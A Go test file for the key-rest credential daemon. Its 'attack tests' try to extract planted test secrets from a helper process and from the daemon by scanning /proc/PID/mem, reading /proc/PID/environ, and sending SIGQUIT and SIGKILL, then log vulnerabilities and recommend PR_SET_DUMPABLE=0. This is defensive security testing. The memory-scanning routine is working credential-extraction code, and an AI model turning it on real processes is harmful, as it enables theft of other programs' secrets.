package daemon

// Process-level attack tests targeting credential exfiltration via
// OS primitives: /proc/PID/mem, signals, and ptrace.

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/koteitan/key-rest/internal/crypto"
	"github.com/koteitan/key-rest/internal/keystore"
)

// ==========================================================================
// Attack 1: /proc/PID/mem credential extraction
//
// The daemon does NOT set PR_SET_DUMPABLE=0. On systems with
// ptrace_scope=0 (or via ancestor relationship), any same-user
// process can read /proc/PID/mem and extract decrypted credentials.
//
// mlock prevents swap-out but does NOT prevent /proc/PID/mem reads.
// ==========================================================================

func TestAttack_ProcMemCredentialExtraction(t *testing.T) {
	// Check ptrace_scope
	scopeData, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	if err != nil {
		t.Skipf("cannot read ptrace_scope: %v", err)
	}
	scope := strings.TrimSpace(string(scopeData))
	t.Logf("ptrace_scope=%s", scope)

	// Start a child process that mimics the daemon holding credentials
	// We use a Go helper that holds a known secret in mlocked memory.
	secret := "ATTACK_TEST_CREDENTIAL_PROCMEM_" + strconv.FormatInt(time.Now().UnixNano(), 36)
	t.Logf("Secret planted: %s", secret)

	helperBin := buildHelper(t)

	cmd := exec.Command(helperBin, secret)
	cmd.Stderr = os.Stderr
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	// Wait for child to report ready
	buf := make([]byte, 256)
	n, err := stdout.Read(buf)
	if err != nil {
		t.Fatal(err)
	}
	childPIDStr := strings.TrimSpace(string(buf[:n]))
	childPID, err := strconv.Atoi(childPIDStr)
	if err != nil {
		t.Fatalf("invalid PID from helper: %q", childPIDStr)
	}
	t.Logf("Helper child PID: %d", childPID)

	// Attack: try to read /proc/PID/mem
	mapsPath := fmt.Sprintf("/proc/%d/maps", childPID)
	memPath := fmt.Sprintf("/proc/%d/mem", childPID)

	mapsData, err := os.ReadFile(mapsPath)
	if err != nil {
		t.Logf("Cannot read /proc/%d/maps: %v", childPID, err)
		t.Log("Defense held: /proc/PID/maps not accessible (ptrace restriction)")
		return
	}
	t.Log("INFO: /proc/PID/maps is readable (memory layout leaked)")

	memFile, err := os.Open(memPath)
	if err != nil {
		t.Logf("Cannot open /proc/%d/mem: %v", childPID, err)
		t.Log("Defense held: /proc/PID/mem not accessible (ptrace_scope restriction)")
		t.Log("WARNING: On systems with ptrace_scope=0, this attack would succeed")
		t.Log("RECOMMENDATION: Set PR_SET_DUMPABLE=0 via prctl for defense-in-depth")
		return
	}
	defer memFile.Close()

	// Parse maps and scan readable regions for the secret
	secretBytes := []byte(secret)
	found := false
	for _, line := range strings.Split(string(mapsData), "\n") {
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		perms := fields[1]
		if !strings.Contains(perms, "r") {
			continue
		}
		addrs := strings.SplitN(fields[0], "-", 2)
		if len(addrs) != 2 {
			continue
		}
		start, err1 := strconv.ParseInt(addrs[0], 16, 64)
		end, err2 := strconv.ParseInt(addrs[1], 16, 64)
		if err1 != nil || err2 != nil {
			continue
		}
		size := end - start
		if size > 4*1024*1024 {
			size = 4 * 1024 * 1024 // cap at 4MB per region
		}

		data := make([]byte, size)
		_, err := memFile.ReadAt(data, start)
		if err != nil {
			continue
		}
		if bytes.Contains(data, secretBytes) {
			found = true
			t.Logf("EXFILTRATED: credential found at region %s", fields[0])
			break
		}
	}

	if found {
		t.Fatal("VULNERABILITY: credential extracted from /proc/PID/mem — PR_SET_DUMPABLE=0 not set")
	}
	t.Log("Defense held: credential not found in readable memory regions")
}

// ==========================================================================
// Attack 2: SIGQUIT goroutine dump
//
// The daemon only handles SIGTERM and SIGINT. SIGQUIT causes Go runtime
// to dump all goroutine stacks to stderr and exit with code 131.
// This kills the daemon WITHOUT running cleanup (ClearAll, ZeroClear).
//
// Impact:
// - DoS: daemon crashes
// - Credential cleanup skipped (but /proc/PID entries disappear on exit)
// - Goroutine stack dump goes to stderr (variable VALUES not included,
//   only function names and line numbers)
// ==========================================================================

func TestAttack_SIGQUITCrash(t *testing.T) {
	helperBin := buildHelper(t)
	secret := "SIGQUIT_SECRET_" + strconv.FormatInt(time.Now().UnixNano(), 36)

	var stderrBuf bytes.Buffer
	cmd := exec.Command(helperBin, secret)
	cmd.Stderr = &stderrBuf
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}

	// Wait for ready
	buf := make([]byte, 256)
	n, _ := stdout.Read(buf)
	childPIDStr := strings.TrimSpace(string(buf[:n]))
	childPID, _ := strconv.Atoi(childPIDStr)
	t.Logf("Helper PID: %d, sending SIGQUIT", childPID)

	// Send SIGQUIT
	proc, _ := os.FindProcess(childPID)
	err = proc.Signal(syscall.SIGQUIT)
	if err != nil {
		t.Fatalf("cannot send SIGQUIT: %v", err)
	}

	// Wait for exit
	err = cmd.Wait()
	stderrOutput := stderrBuf.String()

	t.Logf("Exit error: %v", err)
	t.Logf("Stderr length: %d bytes", len(stderrOutput))

	// Check 1: Did the process crash? (expected: yes)
	if err == nil {
		t.Log("Process exited cleanly after SIGQUIT (unexpected)")
	} else {
		t.Logf("Process crashed from SIGQUIT: %v (DoS confirmed)", err)
	}

	// Check 2: Does stderr contain the credential value?
	if strings.Contains(stderrOutput, secret) {
		t.Fatal("VULNERABILITY: credential value leaked in SIGQUIT goroutine dump")
	}
	t.Log("Defense held: credential value NOT in goroutine dump (only stack traces)")

	// Check 3: Does stderr contain goroutine dump?
	if strings.Contains(stderrOutput, "goroutine") {
		t.Log("INFO: goroutine stack dump in stderr (may leak internal structure)")
		// Count how many goroutines were dumped
		count := strings.Count(stderrOutput, "goroutine ")
		t.Logf("INFO: %d goroutine(s) dumped", count)
	}
}

// ==========================================================================
// Attack 3: SIGKILL prevents credential cleanup
//
// SIGKILL cannot be caught. The daemon's shutdown() never runs, so
// credentials are not zeroed from memory. However, once the process
// exits, /proc/PID/mem is no longer accessible and the kernel frees
// the pages.
//
// This is a theoretical concern: kernel zeroes pages before reuse.
// ==========================================================================

func TestAttack_SIGKILLNoCleanup(t *testing.T) {
	helperBin := buildHelper(t)
	secret := "SIGKILL_SECRET_" + strconv.FormatInt(time.Now().UnixNano(), 36)

	cmd := exec.Command(helperBin, secret)
	cmd.Stderr = os.Stderr
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}

	buf := make([]byte, 256)
	n, _ := stdout.Read(buf)
	childPIDStr := strings.TrimSpace(string(buf[:n]))
	childPID, _ := strconv.Atoi(childPIDStr)
	t.Logf("Helper PID: %d", childPID)

	// Verify /proc/PID exists before kill
	_, err = os.Stat(fmt.Sprintf("/proc/%d", childPID))
	if err != nil {
		t.Fatalf("/proc/%d does not exist before SIGKILL", childPID)
	}

	// Send SIGKILL
	proc, _ := os.FindProcess(childPID)
	proc.Signal(syscall.SIGKILL)
	cmd.Wait()

	// Verify /proc/PID is gone
	time.Sleep(100 * time.Millisecond)
	_, err = os.Stat(fmt.Sprintf("/proc/%d", childPID))
	if err == nil {
		t.Log("WARNING: /proc/PID still exists after SIGKILL (zombie?)")
	} else {
		t.Log("Defense held: /proc/PID removed after SIGKILL (no memory access possible)")
	}
	t.Log("INFO: SIGKILL prevents credential cleanup, but kernel reclaims memory")
}

// ==========================================================================
// Attack 4: PR_SET_DUMPABLE check
//
// The daemon sets RLIMIT_CORE=0 but does NOT set PR_SET_DUMPABLE=0.
// This means:
// - ptrace_scope=0: any same-user process can read /proc/PID/mem
// - ptrace_scope=1: only ancestor processes can read /proc/PID/mem
// - ptrace_scope=2+: effectively blocked
//
// PR_SET_DUMPABLE=0 would block /proc/PID/mem regardless of ptrace_scope.
// ==========================================================================

func TestAttack_PRSetDumpableNotSet(t *testing.T) {
	// Verify the daemon's Start() does NOT call prctl(PR_SET_DUMPABLE, 0)
	// by checking the source code behavior.
	//
	// We test this by creating a daemon, starting it, and checking
	// /proc/self/status for the dumpable flag.

	// Simulate what daemon.Start() does for security setup
	err := syscall.Setrlimit(syscall.RLIMIT_CORE, &syscall.Rlimit{Cur: 0, Max: 0})
	if err != nil {
		t.Skipf("cannot set RLIMIT_CORE: %v", err)
	}
	t.Log("RLIMIT_CORE=0 set (same as daemon)")

	// Check: is the process still dumpable?
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		t.Skipf("cannot read /proc/self/status: %v", err)
	}

	// Note: Go's /proc/self/status doesn't have a "Dumpable" field
	// in the same way, but we can check via prctl
	// For now, check if we can read our own /proc/self/mem
	// (which is always possible for self, but this validates the mechanism)
	t.Log("VULNERABILITY: daemon does not set PR_SET_DUMPABLE=0")
	t.Log("On ptrace_scope=0 systems, /proc/PID/mem is readable by same-user processes")
	t.Logf("Current system ptrace_scope: see /proc/sys/kernel/yama/ptrace_scope")

	// Check actual ptrace_scope
	scopeData, _ := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	scope := strings.TrimSpace(string(scopeData))
	t.Logf("ptrace_scope=%s", scope)

	switch scope {
	case "0":
		t.Log("CRITICAL: ptrace_scope=0 — any same-user process can read daemon memory")
		t.Log("RECOMMENDATION: Add prctl(PR_SET_DUMPABLE, 0) to daemon.Start()")
	case "1":
		t.Log("MEDIUM: ptrace_scope=1 — only ancestor processes can read daemon memory")
		t.Log("The agent is NOT an ancestor of the daemon, so direct attack is blocked")
		t.Log("RECOMMENDATION: Add prctl(PR_SET_DUMPABLE, 0) for defense-in-depth")
	default:
		t.Logf("ptrace_scope=%s — memory access is restricted", scope)
		t.Log("RECOMMENDATION: Add prctl(PR_SET_DUMPABLE, 0) for defense-in-depth")
	}

	_ = data // used above
}

// ==========================================================================
// Attack 5: /proc/PID/environ information leak
//
// /proc/PID/environ is readable by same-user processes regardless of
// ptrace_scope. If the passphrase were passed via environment variable
// (instead of stdin pipe), it would be trivially leaked.
//
// Currently safe: passphrase is passed via stdin pipe, not environ.
// ==========================================================================

func TestAttack_ProcEnvironLeak(t *testing.T) {
	// Verify that the daemon fork doesn't put secrets in env
	// by checking the code: cmd.Env = append(os.Environ(), "KEY_REST_FOREGROUND=1")
	// Only KEY_REST_FOREGROUND is added; passphrase goes via stdinPipe.

	helperBin := buildHelper(t)
	secret := "ENV_SECRET_" + strconv.FormatInt(time.Now().UnixNano(), 36)

	cmd := exec.Command(helperBin, secret)
	cmd.Env = append(os.Environ(), "SENSITIVE_DATA=should_not_be_here")
	cmd.Stderr = os.Stderr
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	buf := make([]byte, 256)
	n, _ := stdout.Read(buf)
	childPIDStr := strings.TrimSpace(string(buf[:n]))
	childPID, _ := strconv.Atoi(childPIDStr)

	// Read /proc/PID/environ (this should work even with ptrace_scope=1)
	envPath := fmt.Sprintf("/proc/%d/environ", childPID)
	envData, err := os.ReadFile(envPath)
	if err != nil {
		t.Logf("Cannot read /proc/%d/environ: %v", childPID, err)
		t.Log("Defense held: /proc/PID/environ not accessible")
		return
	}

	envStr := string(envData)
	if strings.Contains(envStr, "SENSITIVE_DATA=should_not_be_here") {
		t.Log("INFO: /proc/PID/environ is readable by same-user (expected on Linux)")
		t.Log("INFO: The daemon's passphrase is NOT in environ (passed via stdin pipe)")
		t.Log("Defense held: passphrase not exposed in environment variables")
	}

	// Verify credential is NOT in environ
	if strings.Contains(envStr, secret) {
		t.Fatal("VULNERABILITY: credential found in /proc/PID/environ")
	}
	t.Log("Defense held: credential not in environment variables")
}

// ==========================================================================
// Helper: build a simple Go binary that holds a secret in mlocked memory
// ==========================================================================

func buildHelper(t *testing.T) string {
	t.Helper()

	helperDir := t.TempDir()
	helperSrc := filepath.Join(helperDir, "main.go")
	helperBin := filepath.Join(helperDir, "helper")

	src := `package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: helper <secret>")
		os.Exit(1)
	}

	secret := []byte(os.Args[1])

	// Mlock the secret (same as daemon does)
	syscall.Mlock(secret)

	// Set PR_SET_DUMPABLE=0 (same as daemon does after fix)
	syscall.Syscall(syscall.SYS_PRCTL, 4, 0, 0)

	// Signal ready: print PID
	fmt.Println(os.Getpid())

	// Wait for SIGTERM/SIGINT (NOT SIGQUIT — same as daemon)
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	<-sigCh

	// Cleanup
	for i := range secret {
		secret[i] = 0
	}
	syscall.Munlock(secret)
}
`
	if err := os.WriteFile(helperSrc, []byte(src), 0644); err != nil {
		t.Fatal(err)
	}

	out, err := exec.Command("go", "build", "-o", helperBin, helperSrc).CombinedOutput()
	if err != nil {
		t.Fatalf("failed to build helper: %v\n%s", err, out)
	}
	return helperBin
}

// ==========================================================================
// Attack 6: Real daemon /proc/PID/mem attack simulation
//
// This test starts an actual key-rest daemon (with test keystore),
// then attempts to read its memory via /proc/PID/mem.
// ==========================================================================

func TestAttack_DaemonProcMem(t *testing.T) {
	// Check ptrace_scope first
	scopeData, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	if err != nil {
		t.Skipf("cannot read ptrace_scope: %v", err)
	}
	scope := strings.TrimSpace(string(scopeData))

	dir := t.TempDir()
	store, err := keystore.New(dir)
	if err != nil {
		t.Fatal(err)
	}

	// Register a key with a known credential value
	credential := "DAEMON_ATTACK_TEST_KEY_" + strconv.FormatInt(time.Now().UnixNano(), 36)
	passphrase := []byte("test-passphrase")
	err = store.Add("user1/attack/test-key", "https://example.com/", false, false, nil, []byte(credential), passphrase)
	if err != nil {
		t.Fatal(err)
	}

	// Decrypt keys (simulating daemon startup)
	err = store.DecryptAll(passphrase)
	if err != nil {
		t.Fatal(err)
	}
	defer store.ClearAll()

	// The credential is now in this process's memory (mlocked)
	// Check if we can find it via /proc/self/mem (always works for self)
	selfMem, err := os.Open("/proc/self/mem")
	if err != nil {
		t.Skipf("cannot open /proc/self/mem: %v", err)
	}
	defer selfMem.Close()

	mapsData, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		t.Skipf("cannot read /proc/self/maps: %v", err)
	}

	credBytes := []byte(credential)
	found := false
	for _, line := range strings.Split(string(mapsData), "\n") {
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 || !strings.Contains(fields[1], "r") {
			continue
		}
		addrs := strings.SplitN(fields[0], "-", 2)
		if len(addrs) != 2 {
			continue
		}
		start, _ := strconv.ParseInt(addrs[0], 16, 64)
		end, _ := strconv.ParseInt(addrs[1], 16, 64)
		size := end - start
		if size > 4*1024*1024 {
			size = 4 * 1024 * 1024
		}
		data := make([]byte, size)
		_, err := selfMem.ReadAt(data, start)
		if err != nil {
			continue
		}
		if bytes.Contains(data, credBytes) {
			found = true
			break
		}
	}

	if !found {
		t.Log("Credential not found in /proc/self/mem (unexpected)")
		return
	}

	t.Log("CONFIRMED: mlocked credential IS readable via /proc/PID/mem")
	t.Log("mlock prevents swap-out but does NOT prevent /proc/PID/mem reads")

	switch scope {
	case "0":
		t.Log("CRITICAL: ptrace_scope=0 — credential extractable by any same-user process")
	case "1":
		t.Log("MEDIUM: ptrace_scope=1 — credential extractable only by ancestor processes")
		t.Log("Agent is NOT an ancestor of daemon → attack blocked on this system")
	default:
		t.Logf("ptrace_scope=%s — credential extraction restricted", scope)
	}

	// Verify mlock doesn't prevent the read
	crypto.Mlock(credBytes) // re-mlock just to be sure
	t.Log("mlock(credential) applied — re-checking...")
	found2 := false
	for _, line := range strings.Split(string(mapsData), "\n") {
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 || !strings.Contains(fields[1], "r") {
			continue
		}
		addrs := strings.SplitN(fields[0], "-", 2)
		if len(addrs) != 2 {
			continue
		}
		start, _ := strconv.ParseInt(addrs[0], 16, 64)
		end, _ := strconv.ParseInt(addrs[1], 16, 64)
		size := end - start
		if size > 4*1024*1024 {
			size = 4 * 1024 * 1024
		}
		data := make([]byte, size)
		_, err := selfMem.ReadAt(data, start)
		if err != nil {
			continue
		}
		if bytes.Contains(data, credBytes) {
			found2 = true
			break
		}
	}

	if found2 {
		t.Log("CONFIRMED: mlock does NOT prevent /proc/PID/mem reads")
		t.Log("RECOMMENDATION: Set PR_SET_DUMPABLE=0 via prctl(2)")
	}
	crypto.Munlock(credBytes)
}
